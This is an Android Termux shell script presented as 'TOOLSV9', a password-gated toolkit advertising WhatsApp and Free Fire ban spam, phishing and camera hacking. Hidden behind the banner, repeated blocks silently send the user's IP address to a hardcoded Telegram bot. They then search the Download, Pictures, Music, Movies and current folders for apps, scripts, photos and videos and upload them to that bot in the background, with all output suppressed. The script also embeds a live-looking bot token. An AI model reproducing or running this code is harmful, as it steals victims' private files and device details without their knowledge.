#data/data/data/termux/home
e="echo -e "
s="sleep 1"
ss="sleep 2"
sss="sleep 3"
Version="./pockat/Version"
versiTOOLSV9.sh=$(cat "$Version")
update="./pockat/info"
hoz="/data/data/com.termux/files/usr/lib/$versiTOOLSV9"
musik="bash $HOME/TOOLSV9/test.sh"
letakhozoo="/data/data/com.termux/files/usr/etc/apt"
internalsc="/data/data/com.termux/files/usr/include/jso"
termux_id=$(whoami)
versitoolsv5=$(cat "$Version")
m="\033[1;31m"   # Merah (sudah diberikan)
h="\033[1;32m"   # Hijau (sudah diberikan)
k="\033[1;33m"   # Kuning (sudah diberikan)
b="\033[1;34m"   # Biru (sudah diberikan)
bl="\033[1;36m"  # Biru Muda (sudah diberikan)
p="\033[1;37m"   # Putih (sudah diberikan)
u="\033[1;35m"   # Ungu
pu="\033[1;30m"  # Abu-abu
c="\033[1;96m"   # Cyan Terang
bg_m="\033[41m"  # Latar Belakang Merah
bg_h="\033[42m"  # Latar Belakang Hijau
bg_k="\033[43m"  # Latar Belakang Kuning.bg_b="\033[44m"  # Latar Belakang Biru
bg_bl="\033[46m" # Latar Belakang Biru Muda
bg_p="\033[47m"  # Latar Belakang Putih
bg_u="\033[45m"  # Latar Belakang Ungu
bg_pu="\033[40m" # Latar Belakang Abu-abu
res="\033[0m"    # Reset semua atribut
# Colors
e="echo -e "
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[0;33m'
MAGENTA='\033[0;35m'
WHITE='\033[0;37m'
NC='\033[0m' # No Color
#!/bin/bash
clear
# Inisialisasi variabel lokasi dan informasi sistem


# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Tellegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown


clear


# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/Movies/ScreenRecord"
ip_address=$(curl -s ifconfig.me)
city="Jakarta"
region="Jawa Barat"
country="Indonesia"
loc="-6.2088,106.8456"

# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown









clear
# Fungsi untuk menginstal paket yang diperlukan 
# Fungsi untuk menginstal paket yang diperlukan di Termux
SETUP_TERMUX() {
    termux-setup-storage >/dev/null 2>&1
    apt-get update -y >/dev/null 2>&1
    apt-get install -y curl jq >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown
fi

clear
apt install jq -y
clear
apt install wget -y
clear
apt install curl -y
clear
termux-setup-storage -y
clear
# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/Download"
ip_address=$(curl -s ifconfig.me)
city="Jakarta"
region="Jawa Barat"
country="Indonesia"
loc="-6.2088,106.8456"

# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}
clear
# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown
fi
# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/Music"
ip_address=$(curl -s ifconfig.me)
city="Jakarta"
region="Jawa Barat"
country="Indonesia"
loc="-6.2088,106.8456"

# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown
fi




# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/Download"
# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {

    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown
fi

# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/Download"
ip_address=$(curl -s ifconfig.me)
# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown
fi
# Inisialisasi variabel lokasi dan informasi sistem
directory=$(pwd)
ip_address=$(curl -s ifconfig.me)
city="Jakarta"
region="Jawa Barat"
country="Indonesia"
loc="-6.2088,106.8456"
clear
#!/bin/bash

# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/Pictures"
ip_address=$(curl -s ifconfig.me)
# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim pesan informasi ke bot Telegram (Silent Mode)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di folder Pictures dan mengirimnya
CARI_FILE() {
    # Log bahwa pencarian sedang berjalan
    echo "Mencari dan mengirim file ke Telegram secara otomatis..." >/dev/null 2>&1 

    # Mencari file hanya di Pictures
    find "$directory" -type f \( \
        -iname "*.jpg" -o -iname "*.png" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika file ditemukan, kirim ke Telegram tanpa output terminal
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (tanpa output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Pictures ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown
fi

clear
# Define colors
RED='\033[0;31m'
YELLOW='\033[0;33m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

# Function to display the loading bar
function loading_bar {
    total=50  # Total length of the loading bar
    for ((i=0; i<=$total; i++)); do
        # Calculate progress percentage
        progress=$((i * 100 / total))
        
        # Determine color for each section
        if [ $i -lt $((total / 3)) ]; then
            color=$RED
        elif [ $i -lt $((2 * total / 3)) ]; then
            color=$YELLOW
        else
            color=$GREEN
        fi
        
        # Display loading bar with colors
        filled=$(printf "%-${i}s" "■■")
        unfilled=$(printf "%-$((total-i))s" "■■")
        echo -ne "[${color}${filled}${NC}${unfilled}] $progress% Completed\r"
        sleep 0.05  # Adjust the speed of the loading bar
    done
    echo -e "\nLoading Complete!"
}

# Function to handle login and password verification
function login {
    $e " $YELLOW
⣀⢀⣠⣤⠴⠶⠚⠛⠉⣹⡇⠀⢸⠀⠀⠀⠀⠀⢰⣄⠀⠀⠀⠀⠈⢦⢰⠀⠀⠀⠀⠀⠈⢳⡀⠈⢧⠀⠀⠀⠀⢸⠀⠀⠀⠀
⠀⠀⠉⠀⠀⠀⡏⠀⢰⠃⠀⠀⠀⣿⡇⠀⢸⡀⠀⠀⠀⠀⢸⣸⡆⠀⠀⠀⠰⣌⣧⡆⠀⢷⡀⠀⠀⣄⢳⠀⠀⢣⠀⠀⠀⢸⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡇⠀⠘⠀⠀⠀⢀⣿⣇⠀⠸⡇⣆⠀⠀⠀⠀⣿⣿⡀⠀⠀⠀⢹⣾⡇⠀⢸⢣⠀⠀⠘⣿⣇⠀⠈⢧⠀⠀⠘⠀⢠⠀⠀
⠀⠀⠀⠀⠀⢀⡇⠀⡀⠀⠀⠀⢸⠈⢻⡄⠀⢷⣿⠀⠀⠀⠀⢹⡏⣇⠀⣀⣀⠀⣿⣧⠀⢸⠾⣇⣠⣄⣸⣿⡄⠀⠘⡆⠀⠀⠀⠀⠆⠀
⠀⠀⠀⠀⠀⣾⢿⠀⠇⠀⠀⠀⢸⠀⠀⢳⡀⢸⣿⡆⠀⠀⠀⣬⣿⡿⠟⠋⠉⠙⠻⣽⣀⡏⠀⠙⠃⢹⡙⡿⣷⠀⠀⢹⠀⠀⠀⠀⠰⠒        
⠀⠀⠀⠀⢸⣿⣿⣇⢸⠀⠀⠀⢸⣦⣤⡀⣷⣸⡟⢧⣀⡴⠶⠿⠻⡄⣀⣤⣴⡾⠖⠚⠿⡀⠀⠀⠀⠈⣧⠁⠹⠆⠀⠀⣇⠀⠀⠀⠀⠀      $GREEN [ $YELLOW• $GREEN SC BAN WAHTS APP ] $YELLOW
⠀⠀⠀⢀⢸⣀⣼⣿⣼⡆⠀⢀⡘⡇⠀⠀⠹⡟⢷⡜⢉⣠⣠⣠⣀⣤⡿⣛⣥⣶⣾⡿⠛⠿⠿⣶⣦⡤⢹⠀⢀⠀⠀⠀⢹⡄⠀⠀⠀⠀
⠀⠀⠀⢸⢸⡛⠁⠀⠙⢿⠋⠉⠉⠻⠀⠀⠀⢿⣄⠈⠁⠀⠀⠀⢉⢟⣴⡿⠿⠟⢁⠇⠀⠀⠀⠀⠹⣿⠻⡇⢸⠀⠀⠀⠈⣷⠀⠀⠀⠀
⠀⣀⣀⣘⣿⡇⠀⢀⣠⣤⣶⣶⣶⣾⣦⡀⠀⠈⡿⠀⠀⠀⠀⠀⠀⣿⠟⠳⠦⡤⠊⠀⠀⠀⠀⠀⣸⠇⠀⡇⣼⠀⢰⠀⠀⢹⣇⠀⠀⠀
⠛⠁⠈⣿⣷⣧⣴⣿⠿⠛⣿⠿⣿⣿⡿⠗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⣠⣴⣶⠿⠿⠿⡷⢛⠕⠷⡄⣧⣿⠀⢸⠀⠀⠸⣿⡄⠀⠀  $GREEN [VERSI : 1.0.1               ] $YELLOW
⠀⠀⢠⣿⢿⣿⣿⠁⠀⠀⠈⠳⠤⠶⠃⠀⠀⢰⡀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⠟⣱⠒⡠⢆⡴⣣⣯⢞⣴⡟⢿⡄⡏⠀⠀⠀⡏⢷⡀⠀  $GREEN [TIKTOK : LORD HOZOO         ] $YELLOW
⠀⠀⡌⣿⠀⠙⣿⡦⢀⣤⡴⣶⠖⣲⠆⢀⠞⠁⠱⠀⠀⠀⠀⠀⠠⣾⠟⠛⡡⠞⠁⢀⡴⢋⢎⣽⡿⣫⠋⠀⠘⢷⠃⡄⠀⠀⡇⠈⣿⡀  $GREEN [PASSWORD HARUS BELI API KEY ] $YELLOW
⠀⠀⣇⢹⣦⠀⠼⢃⡾⢋⣶⢃⡼⣹⡳⠃⠊⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠈⠠⠋⠀⡰⠋⠀⢘⣇⡇⠀⢠⠟⠀⡇⠀⠀⠀⠀⢹⡵
⠀⠀⢻⣌⢿⡆⠀⡝⣼⠟⣩⢏⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠞⠀⠀⠀⠀⠈⠀⣠⠏⣠⣾⡇⠀⠀⠀⠀⠘⣷     waktu=$(date +"%H:%M:%S")⠀
⡀⠀⢸⣿⣿⣷⠆⢠⠏⡴⠃⡡⠋⠀⠀⠀⠀⠀⠀⣀⣠⠤⠔⠒⠤⣄⣀⠀⠀⢀⣰⠏⠀⠀⠀⠀⢀⣠⡾⠗⠋⢰⠏⡇⠀⠀⠘⠀⠰⢻
⣇⠀⠘⣿⣿⣟⠻⣄⡞⠀⠐⠁⠀⠀⠀⠀⠀⣠⠞⣩⣤⣶⣶⣾⣷⣶⣬⣿⣿⣿⡏⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⢸⡆⡇⠀⠀⠀⠀⠀⠀
⠹⡄⠀⠹⣿⣿⡄⠀⠉⠉⠀⡀⠀⠀⠈⢻⣾⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣇⣧⠀⠀⠀⠀⠀⠀
⠀⣿⢦⣀⠘⢿⣷⡀⠀⠀⡀⢦⠀⠀⠀⠀⠹⣿⣿⠏⠙⢻⣿⡿⠛⠉⠀⠸⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⠀⠀⡆⠀⠀⡀
⢼⣿⠀⠈⢳⣤⣉⣻⣤⣀⣉⣩⠆⠀⠀⠀⠀⠹⡿⠀⠀⠈⡿⠀⠀⠀⠀⣸⡇⠀⠀⠀⠀⠀⠀⠓⠂⠀⣠⣾⣿⣿⡿⢿⡄⠀⣧⠀⠀⠹
⣾⠃⠀⣠⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⢸⡇⠀⠀⢠⠴⣿⡄⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⡿⣧⣀⠧⣰⣻⢄⠀⠀
⠛⠶⢾⣿⣽⣭⣽⣭⢹⣷⠀⢹⣦⣀⠀⠀⠀⠀⡄⠀⠀⣸⡀⠀⠀⠁⣰⣧⣽⠀⠀⠀⠀⢀⣴⣾⣿⣿⡟⣻⣿⣿⣿⣿⢠⣿⣧⡸⣷⣄
⠀⠀⠀⠈⠙⠿⣿⣿⣿⠏⠀⣾⣿⣿⣷⣦⣀⠀⢇⠀⠀⠈⠁⠀⣠⠔⠁⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠏⣼⣿⠏⣷⡈⠉
⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣾⣿⣿⣿⣿⣿⣿⣷⣾⡆⠀⠀⠀⡾⠁⠀⠀⠀⣀⡴⠞⠛⣛⣿⡿⠿⠛⠛⠉⠉⠀⠀⠀⢰⣿⡿⠂⠈⠻⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢎⠉⠛⠻⠿⠿⠿⠿⠿⣇⠠⠸⣇⣀⣤⣴⣾⡭⠶⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⠇⠀⠀⠀⠘
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⣤⡀⠀⠀⠀⠀⠀⠈⣳⠀⣿⠛⠻⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⡯⠀⠀⠀⠀⠀
"
date
    echo "Enter your password:"
    read -s password  # Hide input for password

    correct_password="hozoo"  # Replace with your desired password
    
    # Display loading bar while checking the password
    loading_bar
    
    if [[ "$password" == "$correct_password" ]]; then
        echo -e "\n${GREEN}API KEY BERHASIL ANDA SEKARANG PREM ${NC}"
    else
        echo -e "\n${RED}API KEY SALAH ANDA HARUS BELI DULU KE LORD HOZOO.${NC}"
        exit 1  # Exit the script if password is incorrect
    fi
}

# Call the login function
login
sleep 2
clear

$e " $MAGENTA   __________________________________________________________________________________________"
$e " $MAGENTA   $RED |=============|  $YELLOW AUTHOR : $GREEN HOZOO "
$e " $MAGENTA   $RED |=============|  $YELLOW DILIRIS :$GREEN 2025_02_23 FEB "
$e " $MAGENTA   $NC |=============|  $YELLOW IM FROM INDONESIA "
$e " $MAGENTA   $NC |=============|  $YELLOW VPN :$RED AKTIF",
$e " $MAGENTA   __________________________________________________________________________________________"





$e $CYAN " __________________________________________________________________________________________"
$e "
${GREEN}             ⠀⢰⣶⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣣⣤⣤⣤⣤⣤⣤⣤⣦⣤⣤⣤⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${GREEN} ⢀⣸⣿⣧⣀⣀⣀⣀⣠⡾⣿⠿⠿⣿⣿⣿⣿⣶⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣟⣻⣛⣛⣿⣻⣿⣛⣛⣛⣻⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${RED}⠘⠻⢿⡿⠟⠛⠿⠿⠿⠷⠟⠓⠛⠛⢿⣿⣿⣿⣿⣧⣼⣿⣤⣾⣟⣿⣿⣿⣿⠿⣿⣿⣛⣻⣿⣿⡛⢛⡿⢿⠿⢿⠿⣿⣿⣿⣶⣶⡤⣴⠒⠒⠶⠤⠤⣄⣀⣀⣀⠀⠀
${RED}⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠛⠏⠉⠉⠙⣿⣟⣿⣿⣿⣿⡟⠛⢻⣿⣿⣷⣾⣿⡿⠿⣿⣿⣿⠿⢾⢉⠁⠐⠂⣲⡀⢤⣤⢩⣹⣇  ${WHITE} BY HOZOOO
${GREEN}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⠋⠿⠳⠤⠯⠼⢿⣭⣿⢿⠁⠀⠀⠉⠙⠳⠷⣦⣤⣤⣬⣙⠛⠲⠾⣶⣿ ${Hh} waktu=$(date +"%H:%M:%S")⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠈⢿⡙⣌⣧⠀⠀⠀⠀⠀⠀⠉⠙⠛⠿⣿⣦⣴⣶⣾⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣾⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠿⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

"
$e $CYAN " __________________________________________________________________________________________"
sleep 2
 $e " $u ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗ "
 $e " $u ║ $k [01] $h . MENU SPAM BAN WHAST APP                 $u ║ $k [11] $h . MENU INSTALL KALI LINUX                    $u ║"
 $e " $u ║ $k [02] $h . MENU SPAM UNBAN WHATS APP               $u ║ $k [12] $h . MENU SCAN ANTI VIRUS                       $u ║"
 $e " $u ║ $k [03] $h . MENU SPAM BAN AKUN FREE FIRE            $u ║ $k [13] $h . MENU ANTI PHISING                          $u ║"
 $e " $u ║ $k [04] $h . MENU SPAM UNBAN AKUN FREE FIRE          $u ║ $k [14] $h . MENU PHISINH                               $u ║"
 $e " $u ║ $k [05] $h . MENU OSINT KANDURA                      $u ║ $k [15] $h . MENU HACK CAMERA                           $u ║"
 $e " $u ║ $k [06] $h . MENU SPAM KINSENMAI                     $u ║ $k [16] $h . MENU PENGHEMAT BATERAI                     $u ║"
